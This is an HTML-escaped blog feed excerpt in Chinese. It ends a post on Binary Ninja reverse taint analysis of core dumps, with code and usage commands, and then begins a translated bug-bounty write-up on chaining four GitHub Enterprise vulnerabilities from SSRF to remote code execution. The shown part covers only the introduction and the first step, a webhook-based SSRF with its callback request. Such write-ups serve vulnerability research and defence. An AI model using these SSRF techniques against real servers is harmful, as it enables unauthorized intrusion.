&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bv&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get_functions_containing&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inst_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;medium_level_il&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;inst&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;func&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;func&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get_instruction_start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inst_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ssa_form&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;func&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ssa_form&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;visited_instructions&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;var_stack&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inst&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;vars_read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;var_stack&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;var_stack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;var_stack&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;visited_instructions&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;n&#34;&gt;visited_instructions&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;var&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;decl&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;func&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get_ssa_var_definition&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;var&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;decl&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Argument &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;var&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;var&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34; tainted from function call&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;continue&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;decl&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;operation&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MediumLevelILOperation&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MLIL_CALL_SSA&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;decl&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dest&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;is_constant&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;func_called&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bv&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get_function_at&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decl&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dest&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Tainted by call to&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;func_called&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;(&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decl&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dest&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;)&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Tainted by indirect call at instruction&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decl&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;address&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;continue&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;decl&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;vars_read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;n&#34;&gt;var_stack&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;工具集扩展&#34;&gt;工具集扩展
&lt;/h1&gt;&lt;p&gt;完整的KRFAnalysis包含三个组件：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;main.py&lt;/code&gt; - 从核心转储提取信息并打包&lt;/li&gt;
&lt;li&gt;&lt;code&gt;analyze.py&lt;/code&gt; - 自动运行反向污点分析&lt;/li&gt;
&lt;li&gt;&lt;code&gt;krf.py&lt;/code&gt; - 核心分析逻辑（基于Binary Ninja API）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;使用示例：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 在KRF虚拟机&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 main.py binary core
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 在Binary Ninja环境&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 analyze.py analysis_package.tar.gz
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;结论&#34;&gt;结论
&lt;/h1&gt;&lt;p&gt;Binary Ninja API提供了强大的二进制分析能力，其SSA形式的中间语言显著简化了逆向分析过程。虽然LLVM框架在源码分析方面有优势，但Binary Ninja可以直接处理二进制文件，使其成为无源码情况下的理想选择。&lt;/p&gt;
&lt;p&gt;工具集已开源，包含三个LLVM静态分析pass：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;检测竞态条件(TOCTOU)&lt;/li&gt;
&lt;li&gt;检测未检查的标准库调用错误&lt;/li&gt;
&lt;li&gt;反向污点分析的LLVM实现&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>GitHub Enterprise漏洞链：从SSRF到RCE的四个漏洞利用</title>
        <link>http://localhost:1313/p/github-enterprise%E6%BC%8F%E6%B4%9E%E9%93%BE%E4%BB%8Essrf%E5%88%B0rce%E7%9A%84%E5%9B%9B%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</link>
        <pubDate>Sun, 03 Aug 2025 00:32:56 +0800</pubDate>
        
        <guid>http://localhost:1313/p/github-enterprise%E6%BC%8F%E6%B4%9E%E9%93%BE%E4%BB%8Essrf%E5%88%B0rce%E7%9A%84%E5%9B%9B%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</guid>
        <description>&lt;h1 id=&#34;github-enterprise漏洞链从ssrf到rce的四个漏洞利用&#34;&gt;GitHub Enterprise漏洞链：从SSRF到RCE的四个漏洞利用
&lt;/h1&gt;&lt;p&gt;大家好，我是Orange。距离我上次写博客已经有一段时间了。&lt;/p&gt;
&lt;p&gt;在过去的几个月里，我花了很多时间准备Black Hat USA 2017和DEF CON 25的演讲。成为Black Hat和DEFCON的演讲者一直是我的人生目标之一。这也是我在如此正式的会议上第一次用英语演讲，真是一次难忘的经历:P&lt;/p&gt;
&lt;p&gt;感谢评审委员会的认可。&lt;/p&gt;
&lt;p&gt;这篇文章是我演讲中的一个简单案例研究。这里的技术并不新鲜，但我会向你展示这些老技巧有多么强大！如果你感兴趣，可以在这里查看幻灯片：&lt;/p&gt;
&lt;p&gt;《SSRF的新时代 - 利用流行编程语言中的URL解析器！》&lt;/p&gt;
&lt;p&gt;幻灯片涵盖了更强大的SSRF新方法以及本文未包含的其他技术。&lt;/p&gt;
&lt;p&gt;在本文中，我将向你展示一个漂亮的漏洞利用链，它将4个漏洞串联起来，最终在GitHub Enterprise上实现了远程代码执行(RCE)。这个漏洞还获得了GitHub第三届漏洞赏金周年促销活动的&amp;quot;最佳报告&amp;quot;奖励！&lt;/p&gt;
&lt;h2 id=&#34;前言&#34;&gt;前言
&lt;/h2&gt;&lt;p&gt;在我上一篇博客文章中，我提到了新目标 - GitHub Enterprise，并演示了如何反混淆Ruby代码并在其上找到SQL注入。之后，我看到几位漏洞赏金猎人开始关注GitHub Enterprise，并发现了许多惊人的漏洞，比如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ilektrojohn的《通往你代码库的道路铺满了伪造的断言》&lt;/li&gt;
&lt;li&gt;iblue的《GitHub Enterprise远程代码执行》&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;看到这些文章后，我有点沮丧，责怪自己为什么没有注意到这些。&lt;/p&gt;
&lt;p&gt;因此，我下定决心要找到一个别人没有发现的关键漏洞。当然，是用我自己的方式！&lt;/p&gt;
&lt;h2 id=&#34;漏洞&#34;&gt;漏洞
&lt;/h2&gt;&lt;p&gt;在检查GitHub Enterprise的架构之前，我的直觉告诉我，GitHub Enterprise内部有许多服务。如果我能与它们互动，我相信我能发现一些有趣的东西。&lt;/p&gt;
&lt;p&gt;所以，我专注于寻找服务器端请求伪造(SSRF)漏洞。&lt;/p&gt;
&lt;h3 id=&#34;第一个漏洞---无害的ssrf&#34;&gt;第一个漏洞 - 无害的SSRF
&lt;/h3&gt;&lt;p&gt;在使用GitHub Enterprise时，我注意到一个有趣的功能叫做WebHook。它可以在特定的GIT命令发生时定义一个自定义的HTTP回调。&lt;/p&gt;
&lt;p&gt;你可以从以下URL创建一个HTTP回调：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://&amp;lt;host&amp;gt;/&amp;lt;user&amp;gt;/&amp;lt;repo&amp;gt;/settings/hooks/new
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;并通过提交文件来触发它。GitHub Enterprise会通过HTTP请求通知你。有效载荷和请求如下：&lt;/p&gt;
&lt;p&gt;有效载荷URL：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://orange.tw/foo.php
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;回调请求：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;POST&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;foo&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HTTP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;1.1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;orange&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tw&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Accept&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*/*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;User&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Agent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;GitHub&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Hookshot&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;54651&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ac&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;X&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GitHub&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Event&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ping&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;X&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GitHub&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Delivery&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f4c41980&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e17e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;11e6&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a10&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c8158631728f&lt;/span&gt;
